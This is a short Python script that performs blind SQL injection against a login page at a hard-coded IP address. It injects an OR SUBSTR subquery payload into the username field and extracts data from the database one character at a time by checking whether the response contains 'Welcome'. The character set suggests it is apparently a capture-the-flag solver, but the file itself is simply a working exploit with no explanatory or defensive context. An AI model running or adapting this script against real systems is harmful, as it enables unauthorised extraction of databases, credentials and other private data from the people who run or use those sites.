import requests
import string
import time


possible = ",_{}" + string.digits + string.ascii_letters

url = 'http://20.205.238.7:10125/login.php' # url target
query = input("QUERY: ") # subquery payload
result = ''

i = 1
while True:
    for idx, c in enumerate(possible):
        print(f"TRY LETTER at {i}: {c}")
        payload = f"' OR SUBSTR( ( {query} ), {i}, 1 ) = '{c}' -- "
        res = requests.post(url,
                            data={'username': payload, 'password': ''}, allow_redirects=True)
        if 'Welcome' in res.text:
            result += c
            print(f"FOUND LETTER at {i}: {c}")
            print(f"CURRENT RESULT: {result}")
            time.sleep(1)
            break
        if idx == len(possible) - 1:
            print(f"FINAL RESULT IS: {result}")
            exit(0)
    i += 1